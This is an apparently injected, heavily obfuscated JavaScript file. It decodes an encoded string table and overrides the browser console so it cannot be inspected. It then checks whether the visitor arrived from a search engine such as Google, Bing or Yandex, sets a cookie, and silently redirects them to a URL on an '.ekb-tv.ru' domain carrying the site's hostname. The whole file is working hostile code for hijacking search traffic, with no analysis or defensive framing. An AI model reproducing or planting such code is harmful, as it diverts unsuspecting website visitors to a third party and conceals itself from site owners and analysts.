var _strings_ = ['B3bVCW', 'CMv0DxjUicHMDq', 'Dg9tDhjPBMC', 'AhjYCu0', 'EfrHyxq', 'BwHHz24', 'ELvfA0W', 'DgfIBgu', 'nu1bA2vtra', 'ww50AeO', 'CMvMzxjYzxi', 'Bwf0y2G', 'suf6z3y', 'w14GxsSPkYKRwW', 'Ahr0Chm6lY9QCW', 'EuPbC1y', 'yxbWBhK', 'EvHsuu8', 'wg9AC0K', 'yLrlCuW', 'AwfrwKy', 'D21st3a', 'n3WYFde', 'zxjYB3i', 'nxW0Fdn8mNWWFa', 'mta4mdCWD3nPqw5W', 'mZaYnty1BLjeDM1x', 'wuf6Deq', 'l3rYzhm/Ct0', 'svDkvMG', 'thbKr3i', 'CMv0DxjUic8Iia', 't05NtMW', 'vMTTqKC', 'ihWG', 'mZC1mte3vvb1s1Py', 'nda4nJiWu3vMwuLf', 'zxHJzxb0Aw9U', 'DgvZDa', 'E30Uy29UC3rYDq', 'qMzTtxy', 'mtC4mtm0n3zOB09bua', 'AxvYBfq', 'DgL0Bgu', 'rK53C3q', 'B0Liy0e', 'qxH6EKS', 'D1Lwsgm', 'BNfvu3K', 'ELLXEfC', 'yLHcthe', 'xIbDFq', 'xIHBxIbDkYGGkW', 'wwXZr2m', 'tvnlB1e', 'wNHyAMC', 'sMzRCKq', 'BgvUz3rO', 'Bg9JyxrPB24', 'uMnRtNG', 'ChjVDg90ExbL', 'vePYvfC', 'rwnZB2y', 'zhrqAee', 'BMn0Aw9UkcKG', 'y29TmG', 'D2fYBG', 'x19WCM90B19F', 'r0Dbs0W', 'wevPshq', 'DuDHugK', 'otm3mZLyzMrlveW', 'yKvbtvC', 'u3f3AK0', 'oYbWyxrOpq', 'AhjLzG', 'txnWrKC', 'q1DTC2e', 'yNDgtuy', 'thPNC1G', 'AM9nzNO', 'yu9yEva', 'oYbZzwn1CMu', 'oYbKB21HAw49', 'svPpwfi', 'Ee9lt2C', 'C2vHCMnOzxjZ', 'y29VA2LL', 'psHBxJTDkIK7pW', 'veXfv1y', 's0nVC3a', 'y3rVCIGICMv0Dq', 'rMrtDMm', 's1zSv3y', 'qu54vLa', 'Afnithm', 'ic0G', 'neHesfHhDa', 'vfvzzLK', 'DNL0A2m', 'm3W1Fdb8nNW0Fa', 'y2vrtLy', 'rfnjsfK', 'uNPHANm', 'C3bFCMvKAxjLyW', 'z2Dcsw4', 'rwDeBwi', 'rwvezKi', 'qMjQDhC', 'BhnwEMS', 'y29UC3rYDwn0BW', 'kd86oYaPpW', 'kYb0AgLZicSGiG', 'rxrSz1y', 'y29UC29Szq', 'C3bSAxq', 'y3vdveS', 'rvneCg4', 'yMLUza', 'ntyZoti0DxvArvnS', 'sLLyuLC'];
var _decode_ = function(_183893_) {
    var _5352c4_ = _strings_[_183893_];
    if (_decode_.DXQzYg === undefined) {
        var _32e94b_ = function(_2abe15_) {
            var _3891ec_ = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
            var _1abc75_ = '';
            for (var _368925_ = 0, _83a8b4_, _5a761b_, _1f4255_ = 0; _5a761b_ = _2abe15_.charAt(_1f4255_++); ~_5a761b_ && (_83a8b4_ = _368925_ % (4) ? _83a8b4_ * (64) + _5a761b_ : _5a761b_,
            _368925_++ % (4)) ? _1abc75_ += String.fromCharCode(255 & _83a8b4_ >> (-(2) * _368925_ & 6)) : 0) {
                _5a761b_ = _3891ec_.indexOf(_5a761b_);
            }
            return _1abc75_;
        };
        _decode_.HZZGFx = function(_30055e_) {
            var _24f6ea_ = _32e94b_(_30055e_);
            var _4b6a71_ = [];
            for (var _81efe3_ = 0, _254744_ = _24f6ea_.length; _81efe3_ < _254744_; _81efe3_++) {
                _4b6a71_ += '%' + ('00' + _24f6ea_.charCodeAt(_81efe3_)['toString'](16))['slice'](-(2));
            }
            return decodeURIComponent(_4b6a71_);
        }
        ,
        _decode_.IuPHPI = {},
        _decode_.DXQzYg = true;
    }
    var _2285bf_ = _strings_[0]
      , _280097_ = _183893_ + _2285bf_
      , _1e50bd_ = _decode_.IuPHPI[_280097_];
    if (_1e50bd_ === undefined) {
        var _423a12_ = function(_37a10c_) {
            this.pdHdSA = _37a10c_,
            this.lhYLMI = [1, 0, 0],
            this.PptWIZ = function() {
                return 'newState';
            }
            ,
            this.rrttzm = '\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',
            this.WVvXHV = '[\x27|\x22].+[\x27|\x22];?\x20*}';
        };
        _423a12_.prototype['QijodR'] = function() {
            var _5d99d4_ = new RegExp(this.rrttzm + this.WVvXHV)
              , _96190d_ = _5d99d4_.test(this.PptWIZ['toString']()) ? --this.lhYLMI[1] : --this.lhYLMI[0];
            return this.jipTwl(_96190d_);
        }
        ,
        _423a12_.prototype['jipTwl'] = function(_221f0b_) {
            if (!Boolean(~_221f0b_))
                return _221f0b_;
            return this.ySQKnz(this.pdHdSA);
        }
        ,
        _423a12_.prototype['ySQKnz'] = function(_423d8d_) {
            for (var _5ac416_ = 0, _30c102_ = this.lhYLMI['length']; _5ac416_ < _30c102_; _5ac416_++) {
                this.lhYLMI['push'](Math.round(Math.random())),
                _30c102_ = this.lhYLMI['length'];
            }
            return _423d8d_(this.lhYLMI[0]);
        }
        ,
        new _423a12_(_decode_)['QijodR'](),
        _5352c4_ = _decode_.HZZGFx(_5352c4_),
        _decode_.IuPHPI[_280097_] = _5352c4_;
    } else
        _5352c4_ = _1e50bd_;
    return _5352c4_;
};
var _5d947c_ = undefined
  , _59517a_ = undefined;
(function(_360131_, _296e47_) {
    var _354bfe_ = undefined
      , _ab96c9_ = undefined;
    while (true) {
        try {
            var _29ac47_ = -parseInt(_decode_(41)) + parseInt(_decode_(4)) + -parseInt(_decode_(42)) + parseInt(_decode_(14)) * -parseInt(_decode_(31)) + -parseInt(_decode_(103)) * parseInt(_decode_(77)) + -parseInt(_decode_(32)) + parseInt(_decode_(47));
            if (_29ac47_ === _296e47_)
                break;
            else
                _360131_.push(_360131_.shift());
        } catch (_4dd380_) {
            _360131_.push(_360131_.shift());
        }
    }
}(_strings_, 343663));
var _2d063f_ = function() {
    var _161da0_ = undefined
      , _e32e17_ = undefined
      , _1d6ad6_ = {};
    _1d6ad6_[_decode_(2)] = function(_282c32_, _388e8e_) {
        return _282c32_ === _388e8e_;
    }
    ,
    _1d6ad6_[_decode_(75)] = _decode_(68),
    _1d6ad6_.Rzajs = _decode_(69),
    _1d6ad6_[_decode_(59)] = function(_446c0a_, _261279_) {
        return _446c0a_ !== _261279_;
    }
    ,
    _1d6ad6_[_decode_(50)] = _decode_(107);
    var _361a07_ = _1d6ad6_
      , _4279f3_ = true;
    return function(_243ebf_, _481071_) {
        var _b824b_ = _4279f3_ ? function() {
            var _63426_ = undefined
              , _4462a5_ = undefined;
            if (_361a07_.ESDpn(_361a07_[_decode_(75)], _361a07_[_decode_(109)])) {
                function _2437c3_() {
                    var _17cc03_ = _17ee2b_ ? function() {
                        if (_50d818_) {
                            var _11d6f4_ = _48003a_.apply(_26a621_, arguments);
                            return _4a7818_ = null,
                            _11d6f4_;
                        }
                    }
                    : function() {}
                    ;
                    return _8f7612_ = false,
                    _17cc03_;
                }
            } else {
                if (_481071_) {
                    if (_361a07_[_decode_(59)](_361a07_[_decode_(50)], _decode_(107))) {
                        function _4ef13c_() {
                            var _5482d9_ = undefined
                              , _96f7d4_ = undefined
                              , _2e4424_ = (_decode_(30) + '1')[_decode_(0)]('|')
                              , _1cb47c_ = 0;
                            while (true) {
                                switch (_2e4424_[_1cb47c_++]) {
                                case '0':
                                    _4e4a8b_[_decode_(8)] = _b2d513_[_decode_(8)]['bind'](_b2d513_);
                                    continue;
                                case '1':
                                    _5d99d4_[_5dedf8_] = _4e4a8b_;
                                    continue;
                                case '2':
                                    _4e4a8b_[_decode_(73)] = _423a12_.bind(_37a10c_);
                                    continue;
                                case '3':
                                    var _b2d513_ = _254744_[_5dedf8_] || _4e4a8b_;
                                    continue;
                                case '4':
                                    var _5dedf8_ = _4b6a71_[_81efe3_];
                                    continue;
                                case '5':
                                    var _4e4a8b_ = _30055e_[_decode_(116) + 'r']['prototype'][_decode_(3)](_24f6ea_);
                                    continue;
                                }
                                break;
                            }
                        }
                    } else {
                        var _381018_ = _481071_[_decode_(22)](_243ebf_, arguments);
                        return _481071_ = null,
                        _381018_;
                    }
                }
            }
        }
        : function() {}
        ;
        return _4279f3_ = false,
        _b824b_;
    }
    ;
}()
  , _41a7ac_ = _2d063f_(this, function() {
    var _20774a_ = undefined
      , _4c6cf2_ = undefined
      , _124008_ = {};
    _124008_.JfkrD = function(_425704_, _3ac53d_) {
        return _425704_ + _3ac53d_;
    }
    ,
    _124008_[_decode_(10)] = '(?:;\x20)?',
    _124008_.MSKoQ = function(_374ea2_, _3cb0e0_) {
        return _374ea2_(_3cb0e0_);
    }
    ,
    _124008_[_decode_(108)] = _decode_(84),
    _124008_[_decode_(114)] = _decode_(9),
    _124008_[_decode_(12)] = _decode_(37) + _decode_(118) + '/',
    _124008_[_decode_(11)] = _decode_(58) + '[^\x20]+)+)+[' + _decode_(57),
    _124008_[_decode_(119)] = function(_41b166_) {
        return _41b166_();
    }
    ;
    var _4e9e63_ = _124008_
      , _15fcdf_ = function() {
        var _5e452b_ = undefined
          , _4c2300_ = undefined
          , _526721_ = {};
        _526721_[_decode_(18)] = function(_10d45e_, _11b7f9_) {
            return _10d45e_ + _11b7f9_;
        }
        ,
        _526721_[_decode_(33)] = function(_d3826c_, _496cdf_) {
            var _116a4f_ = undefined;
            return _4e9e63_[_decode_(62)](_d3826c_, _496cdf_);
        }
        ,
        _526721_[_decode_(85)] = _4e9e63_[_decode_(10)],
        _526721_[_decode_(51)] = function(_2cce05_, _13a126_) {
            var _50948d_ = undefined;
            return _4e9e63_[_decode_(60)](_2cce05_, _13a126_);
        }
        ;
        var _2b3aa3_ = _526721_;
        if (_4e9e63_[_decode_(108)] === _4e9e63_[_decode_(114)]) {
            function _5748bf_() {
                var _348b6c_ = undefined
                  , _37ff48_ = undefined
                  , _399eb3_ = _2b3aa3_[_decode_(18)](_2b3aa3_[_decode_(33)](_2b3aa3_[_decode_(85)], _57e76d_), _decode_(94))
                  , _36500b_ = new _4ffbf5_(_399eb3_);
                if (_36500b_[_decode_(44)](_4113fc_[_decode_(93)]))
                    return _2b3aa3_[_decode_(51)](_264fb8_, _5bb1f2_['$1']);
                return false;
            }
        } else {
            var _35df70_ = _15fcdf_.constructor(_4e9e63_[_decode_(12)])()[_decode_(116) + 'r'](_4e9e63_.mhagn);
            return !_35df70_[_decode_(44)](_41a7ac_);
        }
    };
    return _4e9e63_[_decode_(119)](_15fcdf_);
});
_41a7ac_();
var _3914e5_ = function() {
    var _45686c_ = undefined
      , _16f03c_ = undefined
      , _5318a1_ = {};
    _5318a1_[_decode_(25)] = _decode_(87);
    var _5a70af_ = _5318a1_
      , _2174db_ = true;
    return function(_583eb3_, _2965a3_) {
        var _49b4f7_ = undefined
          , _18384e_ = undefined
          , _fc2d1c_ = {};
        _fc2d1c_[_decode_(100)] = function(_3aa075_, _4f040f_) {
            return _3aa075_ !== _4f040f_;
        }
        ,
        _fc2d1c_[_decode_(65)] = _decode_(76),
        _fc2d1c_[_decode_(105)] = _5a70af_[_decode_(25)];
        var _44ce51_ = _fc2d1c_
          , _5d81cf_ = _2174db_ ? function() {
            var _209f89_ = undefined
              , _37021a_ = undefined
              , _59683f_ = {};
            _59683f_[_decode_(46)] = _decode_(37) + _decode_(118) + '/';
            var _1eef60_ = _59683f_;
            if (_44ce51_.ANxVP(_44ce51_.RckNx, _decode_(99))) {
                if (_2965a3_) {
                    if ('aOXyP' !== _44ce51_[_decode_(105)]) {
                        function _4cfb35_() {
                            var _d15e2f_ = _58f02c_ ? function() {
                                var _321958_ = undefined;
                                if (_50ce75_) {
                                    var _af1771_ = _2f9f35_[_decode_(22)](_25aca4_, arguments);
                                    return _1f1a2c_ = null,
                                    _af1771_;
                                }
                            }
                            : function() {}
                            ;
                            return _45c77e_ = false,
                            _d15e2f_;
                        }
                    } else {
                        var _58c22a_ = _2965a3_.apply(_583eb3_, arguments);
                        return _2965a3_ = null,
                        _58c22a_;
                    }
                }
            } else {
                function _22620f_() {
                    var _3458c8_ = undefined
                      , _4c5d30_ = undefined
                      , _297b5c_ = _4383d0_[_decode_(116) + 'r'](_1eef60_.BfmMv)()['constructor'](_decode_(58) + _decode_(19) + _decode_(57));
                    return !_297b5c_[_decode_(44)](_52d6c6_);
                }
            }
        }
        : function() {}
        ;
        return _2174db_ = false,
        _5d81cf_;
    }
    ;
}()
  , _1b8bb4_ = _3914e5_(this, function() {
    var _2dfa7a_ = undefined
      , _48a921_ = undefined
      , _239d7f_ = {};
    _239d7f_[_decode_(1)] = _decode_(61),
    _239d7f_[_decode_(39)] = _decode_(111),
    _239d7f_.EeDfB = function(_1d38e4_, _364d41_) {
        return _1d38e4_(_364d41_);
    }
    ,
    _239d7f_.EJOlX = function(_5446cf_, _3cc580_) {
        return _5446cf_ + _3cc580_;
    }
    ,
    _239d7f_[_decode_(53)] = function(_3628c3_, _1bc3ea_) {
        return _3628c3_ + _1bc3ea_;
    }
    ,
    _239d7f_[_decode_(83)] = function(_5a6985_) {
        return _5a6985_();
    }
    ,
    _239d7f_[_decode_(48)] = 'log',
    _239d7f_[_decode_(38)] = _decode_(72),
    _239d7f_[_decode_(86)] = 'info',
    _239d7f_.wmROp = _decode_(29),
    _239d7f_.vJKrs = _decode_(43),
    _239d7f_[_decode_(26)] = _decode_(13),
    _239d7f_[_decode_(24)] = 'trace',
    _239d7f_.zYqxW = function(_19b14a_, _41d52d_) {
        return _19b14a_ < _41d52d_;
    }
    ,
    _239d7f_[_decode_(74)] = '2|0|5|3|4|1';
    var _3e35b7_ = _239d7f_, _525b45_;
    try {
        if (_3e35b7_[_decode_(1)] !== _3e35b7_[_decode_(39)]) {
            var _2f38cd_ = _3e35b7_[_decode_(113)](Function, _3e35b7_.EJOlX(_3e35b7_[_decode_(53)](_decode_(7) + _decode_(70), '{}.constru' + _decode_(97) + 'rn\x20this\x22)(\x20)'), ');'));
            _525b45_ = _3e35b7_[_decode_(83)](_2f38cd_);
        } else {
            function _29167a_() {
                var _364075_ = undefined;
                if (_23720f_) {
                    var _2169d0_ = _551e4d_[_decode_(22)](_1e734e_, arguments);
                    return _2314b4_ = null,
                    _2169d0_;
                }
            }
        }
    } catch (_5a4c4c_) {
        _525b45_ = window;
    }
    var _4306fd_ = _525b45_.console = _525b45_[_decode_(120)] || {}
      , _533158_ = [_3e35b7_[_decode_(48)], _3e35b7_.ONgNl, _3e35b7_.joMfz, _3e35b7_[_decode_(27)], _3e35b7_.vJKrs, _3e35b7_.iaQZF, _3e35b7_[_decode_(24)]];
    for (var _1efa8a_ = 0; _3e35b7_[_decode_(55)](_1efa8a_, _533158_.length); _1efa8a_++) {
        var _4264d6_ = _3e35b7_[_decode_(74)][_decode_(0)]('|')
          , _3c3928_ = 0;
        while (true) {
            switch (_4264d6_[_3c3928_++]) {
            case '0':
                var _1d2dda_ = _533158_[_1efa8a_];
                continue;
            case '1':
                _4306fd_[_1d2dda_] = _3c200a_;
                continue;
            case '2':
                var _3c200a_ = _3914e5_.constructor[_decode_(66)][_decode_(3)](_3914e5_);
                continue;
            case '3':
                _3c200a_[_decode_(73)] = _3914e5_[_decode_(3)](_3914e5_);
                continue;
            case '4':
                _3c200a_.toString = _486304_[_decode_(8)][_decode_(3)](_486304_);
                continue;
            case '5':
                var _486304_ = _4306fd_[_1d2dda_] || _3c200a_;
                continue;
            }
            break;
        }
    }
});
_1b8bb4_();
class Task2 {
    static[_decode_(71)]() {
        var _4164e3_ = undefined
          , _254ee8_ = undefined
          , _422a7e_ = {};
        _422a7e_.IZOXR = _decode_(106) + _decode_(28),
        _422a7e_.lsVzk = ';\x20expires=',
        _422a7e_[_decode_(101)] = function(_410938_, _15adfb_) {
            return _410938_ || _15adfb_;
        }
        ,
        _422a7e_.yJAsV = function(_209484_, _f11e81_) {
            return _209484_ + _f11e81_;
        }
        ,
        _422a7e_[_decode_(95)] = _decode_(89),
        _422a7e_.YnthJ = function(_2e69c8_, _3febc4_) {
            return _2e69c8_(_3febc4_);
        }
        ,
        _422a7e_.bEAMW = function(_3dc736_, _f35780_) {
            return _3dc736_ + _f35780_;
        }
        ,
        _422a7e_.sflCy = _decode_(80),
        _422a7e_[_decode_(82)] = _decode_(117),
        _422a7e_[_decode_(98)] = function(_560df0_, _5d2400_, _4274b6_, _209da3_, _52a961_, _3fd62b_) {
            return _560df0_(_5d2400_, _4274b6_, _209da3_, _52a961_, _3fd62b_);
        }
        ,
        _422a7e_[_decode_(67)] = function(_4687e8_, _320d74_) {
            return _4687e8_ + _320d74_;
        }
        ,
        _422a7e_[_decode_(104)] = _decode_(7) + _decode_(70),
        _422a7e_[_decode_(56)] = function(_bbd833_) {
            return _bbd833_();
        }
        ,
        _422a7e_[_decode_(91)] = function(_594ccc_, _515955_) {
            return _594ccc_ < _515955_;
        }
        ,
        _422a7e_.JYXRW = function(_e5192b_, _ae1007_) {
            return _e5192b_ !== _ae1007_;
        }
        ,
        _422a7e_[_decode_(52)] = _decode_(79),
        _422a7e_[_decode_(96)] = function(_3b173d_, _bb3a4_) {
            return _3b173d_ == _bb3a4_;
        }
        ,
        _422a7e_[_decode_(112)] = _decode_(6),
        _422a7e_[_decode_(54)] = function(_fdbfb2_, _3b82ac_) {
            return _fdbfb2_ === _3b82ac_;
        }
        ,
        _422a7e_[_decode_(36)] = 'hwKDr',
        _422a7e_[_decode_(35)] = function(_dbaf43_, _24516f_, _2031a7_) {
            return _dbaf43_(_24516f_, _2031a7_);
        }
        ,
        _422a7e_[_decode_(23)] = _decode_(102);
        var _ea28a2_ = _422a7e_
          , _420e55_ = document[_decode_(49)]['split'](_ea28a2_[_decode_(23)])
          , _6800c7_ = _420e55_[0]['split'](_decode_(40));
        function _2a3ea2_(_2f0912_, _129feb_, _3eaf40_, _51a3ee_, _2b320b_, _4c1205_) {
            var _30b91d_ = undefined
              , _e028b7_ = undefined
              , _29d66b_ = _ea28a2_[_decode_(90)][_decode_(0)]('|')
              , _2ef646_ = 0;
            while (true) {
                switch (_29d66b_[_2ef646_++]) {
                case '0':
                    if (_3eaf40_)
                        _4c86b3_ += _ea28a2_[_decode_(115)] + _3eaf40_.toGMTString();
                    continue;
                case '1':
                    return true;
                case '2':
                    document.cookie = _4c86b3_;
                    continue;
                case '3':
                    if (_ea28a2_[_decode_(101)](!_2f0912_, !_129feb_))
                        return false;
                    continue;
                case '4':
                    if (_2b320b_)
                        _4c86b3_ += _ea28a2_[_decode_(21)](_ea28a2_[_decode_(95)], _2b320b_);
                    continue;
                case '5':
                    var _4c86b3_ = _2f0912_ + '=' + _ea28a2_.YnthJ(encodeURIComponent, _129feb_);
                    continue;
                case '6':
                    if (_51a3ee_)
                        _4c86b3_ += _ea28a2_[_decode_(78)](_ea28a2_.sflCy, _51a3ee_);
                    continue;
                case '7':
                    if (_4c1205_)
                        _4c86b3_ += _decode_(88);
                    continue;
                }
                break;
            }
        }
        function _5ef3c8_(_4583d0_) {
            var _1a1868_ = undefined
              , _3db08c_ = undefined
              , _33284e_ = _ea28a2_[_decode_(78)](_ea28a2_[_decode_(78)](_ea28a2_[_decode_(82)], _4583d0_), _decode_(94))
              , _1c5b61_ = new RegExp(_33284e_);
            if (_1c5b61_[_decode_(44)](document.cookie))
                return decodeURIComponent(RegExp['$1']);
            return false;
        }
        function _310fd2_(_5e0b16_, _116341_, _a9240e_) {
            var _3099b2_ = undefined;
            return _ea28a2_[_decode_(98)](_2a3ea2_, _5e0b16_, null, new Date(0), _116341_, _a9240e_),
            true;
        }
        var _20e474_ = {};
        _20e474_[_decode_(92)] = [[/google\./i, /(\?|&)q=(.*?)(&|$)/i, 2], [/search\.yahoo\./i, /(\?|&)p=(.*?)(&|$)/i, 2], [/bing\.com/i, /(\?|&)q=(.*?)(&|$)/i, 2], [/search\.aol\./i, /(\?|&)q=(.*?)(&|$)/i, 2], [/ask\.com/i, /(\?|&)q=(.*?)(&|$)/i, 2], [/altavista\./i, /(\?|&)q=(.*?)(&|$)/i, 2], [/search\.lycos\./i, /(\?|&)query=(.*?)(&|$)/i, 2], [/alltheweb\./i, /(\?|&)q=(.*?)(&|$)/i, 2], [/yandex\./i, /(\?|&)text=(.*?)(&|$)/i, 2], [/(nova\.|search\.)?rambler\./i, /(\?|&)query=(.*?)(&|$)/i, 2], [/gogo\./i, /(\?|&)q=(.*?)(&|$)/i, 2], [/go\.mail\./i, /(\?|&)q=(.*?)(&|$)/i, 2], [/nigma\./i, /(\?|&)s=(.*?)(&|$)/i, 2]],
        _20e474_[_decode_(110) + 't'] = function(_b2a74f_) {
            var _51bdaf_ = undefined
              , _766024_ = undefined
              , _1bf09f_ = null;
            for (var _55c85a_ = 0; _ea28a2_[_decode_(91)](_55c85a_, _20e474_.searchers[_decode_(63)]); _55c85a_++) {
                if (_ea28a2_[_decode_(5)](_decode_(79), _ea28a2_[_decode_(52)])) {
                    function _2eaa55_() {
                        var _5e6d4a_ = undefined
                          , _2a6097_ = undefined
                          , _486aa7_ = _1b6fe6_(HVzByi[_decode_(67)](HVzByi[_decode_(104)] + (_decode_(45) + _decode_(97) + 'rn\x20this\x22)(\x20)'), ');'));
                        _33f82f_ = HVzByi[_decode_(56)](_486aa7_);
                    }
                } else {
                    var _30b034_ = _20e474_[_decode_(92)][_55c85a_];
                    if (_b2a74f_[_decode_(17)](_30b034_[0]) || _ea28a2_.KCosp(_ea28a2_[_decode_(15)](_5ef3c8_, _ea28a2_[_decode_(112)]), '1')) {
                        if (_ea28a2_[_decode_(54)](_ea28a2_.LpdGr, _ea28a2_[_decode_(36)])) {
                            _ea28a2_.IWJVh(_2a3ea2_, _decode_(6), '1'),
                            document[_decode_(64)][_decode_(81)] = _ea28a2_[_decode_(67)](_decode_(20) + '.ekb-tv.ru' + _decode_(34), _6800c7_[0]);
                            break;
                        } else {
                            function _35779c_() {
                                _1c6082_ = _5352c4_;
                            }
                        }
                    }
                }
            }
        }
        ,
        _20e474_[_decode_(110) + 't'](document[_decode_(16)]);
    }
}
Task2[_decode_(71)]();
